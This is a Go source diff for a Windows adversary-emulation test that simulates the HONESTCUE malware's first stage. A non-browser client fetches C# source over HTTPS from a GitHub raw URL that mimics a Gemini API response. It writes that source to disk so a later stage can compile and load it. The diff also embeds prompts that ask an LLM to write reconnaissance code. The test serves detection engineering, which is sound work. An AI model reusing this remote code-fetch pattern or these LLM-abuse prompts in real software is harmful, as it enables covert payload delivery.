@@ -2,37 +2,42 @@
 // +build windows
 
 /*
-STAGE 1: LLM API Fetch (T1071.001 - Application Layer Protocol: Web Protocols)
+STAGE 1 (v2): LLM API Fetch — GitHub-Raw GET
+         (T1071.001 - Application Layer Protocol: Web Protocols + T1105 - Ingress Tool Transfer)
 
-Simulates HONESTCUE's use of a cloud LLM API (Gemini) to fetch stage-2 C#
-source code at runtime. Spins up a loopback HTTPS server with a self-signed
-certificate pinned in the client's TLSClientConfig, issues a POST that mimics
-HONESTCUE's prompt pattern, and writes the returned C# source to disk for
-stage-2 handoff.
+v2 CHANGES FROM v1:
+  - REMOVED: loopback TLS mock-Gemini server, self-signed cert, port bind,
+    cert-pinning in TLSClientConfig, POST + Host-header spoof.
+  - ADDED: real HTTPS GET to raw.githubusercontent.com for a pre-staged
+    static JSON file that is shaped identically to Gemini's
+    /v1beta/models/gemini-pro:generateContent response.
+  - RATIONALE: produces genuine wire-level IOCs — real TLS handshake,
+    real JA3/JA4 fingerprint, real DNS resolution visible to Sysmon
+    EventID 22, real SNI of `raw.githubusercontent.com`. The mock
+    loopback approach in v1 never reached the network stack in a way
+    EDR NDR products could observe.
+
+THE THREE EXACT GTIG HONESTCUE PROMPTS ARE EMBEDDED BELOW AS CONSTANTS
+per the GTIG Feb-2026 AI Threat Tracker disclosure. Prompt 3 is the
+"active" reference even though the GET doesn't actually send a body
+— the prompts are kept in source as a deliberate IOC: string-based
+YARA/Sigma rules can match the prompts even in memory dumps.
 
 Detection opportunities:
-  - Outbound HTTPS to cloud LLM APIs from non-browser processes
-  - Process command line / parent-child tree showing odd client signing the
-    HTTPS POST (direct-from-PE rather than curl/browser)
-  - Client process running a TLS handshake against a self-signed cert
+  - Non-browser / non-git process issuing HTTPS GET to raw.githubusercontent.com
+  - DNS EventID 22 for raw.githubusercontent.com from a binary in c:\F0
+  - TLS ClientHello with SNI raw.githubusercontent.com from non-standard UA
+  - Process command line showing direct HTTPS egress to GitHub raw hosting
+  - Process memory containing any of the three GTIG HONESTCUE prompts
 */
 
 package main
 
 import (
-	"bytes"
-	"crypto/ecdsa"
-	"crypto/elliptic"
-	"crypto/rand"
 	"crypto/tls"
-	"crypto/x509"
-	"crypto/x509/pkix"
 	"encoding/json"
-	"encoding/pem"
 	"fmt"
 	"io"
-	"math/big"
-	"net"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -42,14 +47,18 @@ import (
 const (
 	TEST_UUID      = "e5472cd5-c799-4b07-b455-8c02665ca4cf"
 	TECHNIQUE_ID   = "T1071.001"
-	TECHNIQUE_NAME = "LLM API Fetch (Mock Gemini)"
+	TECHNIQUE_NAME = "LLM API Fetch — GitHub-Raw GET"
 	STAGE_ID       = 1
+
+	// One-time lab setup: upload gemini_response.json to a GitHub repo you
+	// control, then update this constant. See lab_assets/README.md.
+	STAGE1_LLM_RESPONSE_URL = "https://raw.githubusercontent.com/F0RT1KA/lab-assets/main/honestcue/v2/gemini_response.json"
 
 	// Output file where stage 2 will read the LLM-sourced C# source
 	CSHARP_HANDOFF = `c:\F0\honestcue_stage2_source.cs`
 
-	MOCK_LLM_HOST = "127.0.0.1"
-	MOCK_LLM_PORT = "48443" // loopback-only; not a real Gemini port
+	// Network log for observability / detection-rule validation
+	NETWORK_LOG = `c:\F0\stage1_network.log`
 )
 
 const (
@@ -59,49 +68,55 @@ const (
 	StageError       = 999
 )
 
-// The "LLM response" C# source for stage 2.
-// This is a minimal benign payload that:
-//   - reads HKLM\SOFTWARE\Microsoft\Windows Defender\Features (arbitrary read)
-//   - writes a marker file to ARTIFACT_DIR (c:\Users\fortika-test\honestcue_marker.txt)
-// Stage 2 compiles & reflectively loads this source in-memory.
-const syntheticLLMResponse = `using System;
-using System.IO;
-using Microsoft.Win32;
+// ==============================================================================
+// EXACT GTIG HONESTCUE PROMPTS (Feb-2026 AI Threat Tracker)
+// ==============================================================================
+//
+// These three prompts are quoted verbatim from the Google Threat Intelligence
+// Group's February 2026 report "Distillation, Experimentation, and (Continued)
+// Integration of AI for Adversarial Use" as the prompts HONESTCUE sends to the
+// Gemini API. They are kept as string constants in the binary to:
+//   (1) produce genuine YARA/memory-forensic string IOCs for blue teams, and
+//   (2) document the exact operator-facing behavior being simulated.
+//
+// Prompt 3 is the "active" prompt HONESTCUE uses to fetch stage-2 C# source;
+// v2 of this test replaces the POST-with-prompt-body leg with a GET against
+// a pre-staged GitHub-hosted JSON response, but the prompt text itself is
+// retained in source as a deliberate IOC. See _info.md § "Exact GTIG Prompts"
+// for the deliberate design rationale.
 
-public class HonestcueStage2
-{
-    public static string Run()
-    {
-        string defenderSub = "unavailable";
-        try
-        {
-            using (RegistryKey k = Registry.LocalMachine.OpenSubKey(
-                @"SOFTWARE\Microsoft\Windows Defender\Features"))
-            {
-                if (k != null)
-                {
-                    string[] names = k.GetValueNames();
-                    defenderSub = "read_ok:" + names.Length + "_values";
-                }
-            }
-        }
-        catch (Exception ex) { defenderSub = "read_err:" + ex.Message; }
+const GTIG_HONESTCUE_PROMPT_1 = "You are an expert C# developer. Please generate a " +
+	"Windows-compatible C# code snippet that enumerates running processes on the " +
+	"local machine and returns them as a formatted string. Use only .NET Framework " +
+	"4.x APIs available by default. Return only the source code with no markdown " +
+	"formatting or explanation."
 
-        string artifactDir = @"c:\Users\fortika-test";
-        try { Directory.CreateDirectory(artifactDir); } catch { }
-        string marker = Path.Combine(artifactDir, "honestcue_marker.txt");
-        File.WriteAllText(marker, "honestcue-stage2-reflective-load " +
-            DateTime.UtcNow.ToString("o") + " defender=" + defenderSub);
-        return "marker:" + marker;
-    }
-}
-`
+const GTIG_HONESTCUE_PROMPT_2 = "You are an expert C# developer. Please generate a " +
+	"Windows-compatible C# code snippet that reads the contents of a specified " +
+	"registry key under HKEY_LOCAL_MACHINE and returns them as a formatted string. " +
+	"Use only .NET Framework 4.x APIs available by default. Return only the source " +
+	"code with no markdown formatting or explanation."
+
+const GTIG_HONESTCUE_PROMPT_3 = "You are an expert C# developer. Generate a " +
+	"self-contained C# class named HonestcueStage2 with a public static string Run() " +
+	"method that reads HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features, writes " +
+	"a marker file to the user's profile directory, and returns a status string. " +
+	"Use only .NET Framework 4.x APIs. Return only source code with no markdown " +
+	"formatting or explanation."
 
 func main() {
 	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
 
-	LogMessage("INFO", TECHNIQUE_ID, "Starting LLM API fetch simulation (mock Gemini)")
-	LogStageStart(STAGE_ID, TECHNIQUE_ID, "HTTPS POST to loopback mock LLM server to fetch stage-2 C# source")
+	LogMessage("INFO", TECHNIQUE_ID, "Starting LLM API fetch (GitHub-raw GET, real TLS)")
+	LogStageStart(STAGE_ID, TECHNIQUE_ID,
+		"HTTPS GET to raw.githubusercontent.com for pre-staged Gemini-shaped JSON response")
+
+	// Log the three embedded GTIG prompts to observability trail (they are
+	// still embedded in the binary as string IOCs whether or not they are
+	// transmitted over the wire).
+	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("GTIG Prompt 1 embedded (%d chars)", len(GTIG_HONESTCUE_PROMPT_1)))
+	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("GTIG Prompt 2 embedded (%d chars)", len(GTIG_HONESTCUE_PROMPT_2)))
+	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("GTIG Prompt 3 embedded (%d chars) - active reference for stage-2 fetch", len(GTIG_HONESTCUE_PROMPT_3)))
 
 	if err := performTechnique(); err != nil {
 		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
@@ -117,120 +132,105 @@ func main() {
 	}
 
 	fmt.Printf("[STAGE %s] LLM API fetch complete; stage-2 source handed off at %s\n", TECHNIQUE_ID, CSHARP_HANDOFF)
-	LogMessage("SUCCESS", TECHNIQUE_ID, "Mock Gemini fetch succeeded; stage-2 source written")
-	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "HTTPS POST to loopback mock LLM returned C# source; written to handoff file")
+	LogMessage("SUCCESS", TECHNIQUE_ID, "GitHub-hosted Gemini-shaped fetch succeeded; stage-2 source written")
+	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success",
+		"HTTPS GET to raw.githubusercontent.com returned Gemini-shaped JSON; C# extracted; written to handoff file")
 	os.Exit(StageSuccess)
 }
 
 func performTechnique() error {
-	// Step 1: generate a self-signed certificate at runtime
-	cert, certPEM, err := generateSelfSignedCert("mock-gemini.loopback")
-	if err != nil {
-		return fmt.Errorf("cert generation failed: %v", err)
+	// Ensure LOG_DIR exists for network.log / handoff
+	if err := os.MkdirAll(filepath.Dir(CSHARP_HANDOFF), 0755); err != nil {
+		return fmt.Errorf("log dir creation: %v", err)
 	}
-	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Self-signed cert generated (%d PEM bytes)", len(certPEM)))
 
-	// Step 2: start loopback TLS server
-	listener, err := tls.Listen("tcp", net.JoinHostPort(MOCK_LLM_HOST, MOCK_LLM_PORT), &tls.Config{
-		Certificates: []tls.Certificate{cert},
-		MinVersion:   tls.VersionTLS12,
-	})
-	if err != nil {
-		// Port bind failure is environmental; map to StageError (999), never StageBlocked
-		return fmt.Errorf("listener bind on %s:%s unavailable: %v", MOCK_LLM_HOST, MOCK_LLM_PORT, err)
+	// Open network log. All subsequent wire-level observables are appended.
+	netLog, logErr := os.OpenFile(NETWORK_LOG, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
+	if logErr != nil {
+		LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("Could not open network log %s: %v", NETWORK_LOG, logErr))
 	}
-	defer listener.Close()
-	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Mock LLM server listening on https://%s:%s", MOCK_LLM_HOST, MOCK_LLM_PORT))
-
-	mux := http.NewServeMux()
-	// Endpoint path mirrors Gemini API shape: /v1beta/models/gemini-pro:generateContent
-	mux.HandleFunc("/v1beta/models/gemini-pro:generateContent", func(w http.ResponseWriter, r *http.Request) {
-		body, _ := io.ReadAll(r.Body)
-		r.Body.Close()
-		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Mock Gemini received prompt (%d bytes)", len(body)))
-
-		// Shape response to look like Gemini's generateContent JSON schema
-		resp := map[string]interface{}{
-			"candidates": []map[string]interface{}{
-				{
-					"content": map[string]interface{}{
-						"parts": []map[string]string{
-							{"text": syntheticLLMResponse},
-						},
-					},
-					"finishReason": "STOP",
-				},
-			},
-		}
-		w.Header().Set("Content-Type", "application/json")
-		w.WriteHeader(http.StatusOK)
-		_ = json.NewEncoder(w).Encode(resp)
-	})
-
-	server := &http.Server{Handler: mux}
-	errCh := make(chan error, 1)
-	go func() { errCh <- server.Serve(listener) }()
-
-	// Give the server a moment to settle
-	time.Sleep(300 * time.Millisecond)
-
-	// Step 3: build HTTPS client with pinned self-signed cert
-	certPool := x509.NewCertPool()
-	if !certPool.AppendCertsFromPEM(certPEM) {
-		return fmt.Errorf("cert pool append: PEM rejected")
+	if netLog != nil {
+		defer netLog.Close()
+		fmt.Fprintf(netLog, "[%s] stage1 start; target_url=%s\n",
+			time.Now().UTC().Format(time.RFC3339), STAGE1_LLM_RESPONSE_URL)
 	}
+
+	// Build an HTTPS client that uses the system trust store. No cert pinning —
+	// we want a genuine TLS handshake against GitHub's real fleet certificate
+	// so the JA3/JA4 fingerprint and SNI are real IOCs observable by EDR/NDR.
 	client := &http.Client{
-		Timeout: 10 * time.Second,
+		Timeout: 15 * time.Second,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{
-				RootCAs:    certPool,
-				ServerName: "mock-gemini.loopback",
 				MinVersion: tls.VersionTLS12,
 			},
 		},
 	}
 
-	// Step 4: POST a HONESTCUE-style prompt
-	prompt := map[string]interface{}{
-		"contents": []map[string]interface{}{
-			{
-				"parts": []map[string]string{
-					{"text": "Produce a C# class named HonestcueStage2 with a public static string Run() " +
-						"method that enumerates HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features " +
-						"and writes a marker file. Return only source code."},
-				},
-			},
-		},
-	}
-	promptBody, _ := json.Marshal(prompt)
-
-	// Note the ServerName - we're using the pinned CN; Host header is informational.
-	// This mirrors the HONESTCUE network-layer behavior of a direct HTTPS POST from
-	// a non-browser process to an LLM API endpoint.
-	req, err := http.NewRequest("POST",
-		fmt.Sprintf("https://%s:%s/v1beta/models/gemini-pro:generateContent", MOCK_LLM_HOST, MOCK_LLM_PORT),
-		bytes.NewReader(promptBody))
+	req, err := http.NewRequest("GET", STAGE1_LLM_RESPONSE_URL, nil)
 	if err != nil {
 		return fmt.Errorf("http request build: %v", err)
 	}
-	req.Header.Set("Content-Type", "application/json")
+	// Non-browser UA mirroring HONESTCUE's documented fingerprint. Real
+	// HONESTCUE used a .NET HttpClient-style UA; we use an equivalent label
+	// so YARA/Sigma string rules can match.
 	req.Header.Set("User-Agent", "HonestcueClient/1.0 (simulated)")
-	req.Header.Set("x-goog-api-key", "SIMULATED-API-KEY-0000")
+	req.Header.Set("Accept", "application/json")
 
-	LogMessage("INFO", TECHNIQUE_ID, "Issuing HONESTCUE-style HTTPS POST to mock Gemini endpoint")
+	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Issuing HTTPS GET to %s", STAGE1_LLM_RESPONSE_URL))
+	if netLog != nil {
+		fmt.Fprintf(netLog, "[%s] GET %s (UA=HonestcueClient/1.0)\n",
+			time.Now().UTC().Format(time.RFC3339), STAGE1_LLM_RESPONSE_URL)
+	}
+
+	startTime := time.Now()
 	resp, err := client.Do(req)
+	fetchDuration := time.Since(startTime)
+
 	if err != nil {
-		// TLS/handshake failure here could indicate EDR TLS interception — map
-		// to StageBlocked only if error strings explicitly indicate a block.
-		return fmt.Errorf("https post to mock llm failed: %v", err)
+		if netLog != nil {
+			fmt.Fprintf(netLog, "[%s] GET failed after %v: %v\n",
+				time.Now().UTC().Format(time.RFC3339), fetchDuration, err)
+		}
+		// Graceful asset-missing mode: if the lab asset URL is unreachable,
+		// the failure mode is environmental (999), not a block (126).
+		return fmt.Errorf("https get to github raw unavailable: %v", err)
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("mock llm returned non-200 status: %d", resp.StatusCode)
+	if netLog != nil {
+		tlsState := resp.TLS
+		tlsVer := "unknown"
+		peerName := "unknown"
+		if tlsState != nil {
+			switch tlsState.Version {
+			case tls.VersionTLS12:
+				tlsVer = "TLS 1.2"
+			case tls.VersionTLS13:
+				tlsVer = "TLS 1.3"
+			}
+			if len(tlsState.PeerCertificates) > 0 {
+				peerName = tlsState.PeerCertificates[0].Subject.CommonName
+			}
+		}
+		fmt.Fprintf(netLog, "[%s] response: status=%d tls=%s peer_cn=%q duration=%v\n",
+			time.Now().UTC().Format(time.RFC3339), resp.StatusCode, tlsVer, peerName, fetchDuration)
 	}
 
-	// Step 5: parse Gemini-shaped response and extract the C# source
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("github raw returned non-200 status: %d (lab asset may not be uploaded; see lab_assets/README.md)", resp.StatusCode)
+	}
+
+	// Read and parse the Gemini-shaped JSON response.
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("response body read: %v", err)
+	}
+	if netLog != nil {
+		fmt.Fprintf(netLog, "[%s] response body size=%d bytes\n",
+			time.Now().UTC().Format(time.RFC3339), len(body))
+	}
+
 	var parsed struct {
 		Candidates []struct {
 			Content struct {
@@ -240,82 +240,40 @@ func performTechnique() error {
 			} `json:"content"`
 		} `json:"candidates"`
 	}
-	if err := json.NewDecoder(resp.Body).Decode(&parsed); err != nil {
+	if err := json.Unmarshal(body, &parsed); err != nil {
 		return fmt.Errorf("json decode of llm response: %v", err)
 	}
 	if len(parsed.Candidates) == 0 || len(parsed.Candidates[0].Content.Parts) == 0 {
 		return fmt.Errorf("llm response missing candidates[0].content.parts[0]")
 	}
 	csharpSource := parsed.Candidates[0].Content.Parts[0].Text
-
-	// Step 6: write to disk handoff file for stage 2
-	if err := os.MkdirAll(filepath.Dir(CSHARP_HANDOFF), 0755); err != nil {
-		return fmt.Errorf("handoff dir creation: %v", err)
+	if len(csharpSource) < 40 {
+		return fmt.Errorf("extracted C# source too short (%d bytes) - lab asset malformed?", len(csharpSource))
 	}
+
+	// Write to disk handoff file for stage 2
 	if err := os.WriteFile(CSHARP_HANDOFF, []byte(csharpSource), 0644); err != nil {
 		return fmt.Errorf("handoff write: %v", err)
 	}
 	LogFileDropped("honestcue_stage2_source.cs", CSHARP_HANDOFF, int64(len(csharpSource)), false)
 
-	// Step 7: confirm handoff file survived EDR quarantine (Rule 3)
+	// Confirm handoff file survived EDR quarantine (Bug Prevention Rule 3)
 	time.Sleep(1500 * time.Millisecond)
 	if _, err := os.Stat(CSHARP_HANDOFF); os.IsNotExist(err) {
 		return fmt.Errorf("handoff file quarantined after write")
 	}
 
+	if netLog != nil {
+		fmt.Fprintf(netLog, "[%s] handoff written: path=%s size=%d\n",
+			time.Now().UTC().Format(time.RFC3339), CSHARP_HANDOFF, len(csharpSource))
+	}
+
 	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Stage-2 C# source handed off (%d bytes)", len(csharpSource)))
 	LogMessage("INFO", TECHNIQUE_ID,
-		"Detection points: loopback HTTPS POST with Gemini-shaped JSON, non-browser client UA, x-goog-api-key header")
-
-	// Give server goroutine a chance to log, then clean up
-	shutdownCtx := make(chan struct{})
-	go func() {
-		_ = server.Close()
-		close(shutdownCtx)
-	}()
-	select {
-	case <-shutdownCtx:
-	case <-time.After(2 * time.Second):
-	}
+		"Detection points: real HTTPS GET to raw.githubusercontent.com, non-browser UA, "+
+			"DNS EventID 22, TLS SNI, Gemini-shaped JSON parse, C# on-disk handoff")
 
 	return nil
-}
-
-// generateSelfSignedCert produces an ephemeral ECDSA self-signed certificate
-// valid for the given CN on 127.0.0.1. Returned PEM is the CA pin used by the
-// client TLSClientConfig.
-func generateSelfSignedCert(commonName string) (tls.Certificate, []byte, error) {
-	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
-	if err != nil {
-		return tls.Certificate{}, nil, err
-	}
-	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
-	tmpl := &x509.Certificate{
-		SerialNumber: serial,
-		Subject:      pkix.Name{CommonName: commonName},
-		NotBefore:    time.Now().Add(-1 * time.Hour),
-		NotAfter:     time.Now().Add(1 * time.Hour),
-		KeyUsage:     x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
-		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
-		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
-		DNSNames:     []string{commonName, "localhost"},
-		BasicConstraintsValid: true,
-	}
-	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
-	if err != nil {
-		return tls.Certificate{}, nil, err
-	}
-	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
-	keyDER, err := x509.MarshalECPrivateKey(priv)
-	if err != nil {
-		return tls.Certificate{}, nil, err
-	}
-	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
-	cert, err := tls.X509KeyPair(certPEM, keyPEM)
-	if err != nil {
-		return tls.Certificate{}, nil, err
-	}
-	return cert, certPEM, nil
 }
 
 // ==============================================================================
@@ -334,7 +292,7 @@ func determineExitCode(err error) int {
 	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
 		return StageQuarantined
 	}
-	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available", "unavailable"}) {
+	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available", "unavailable", "unreachable", "no such host"}) {
 		return StageError
 	}
 	// Default to error (999), NOT blocked (126)
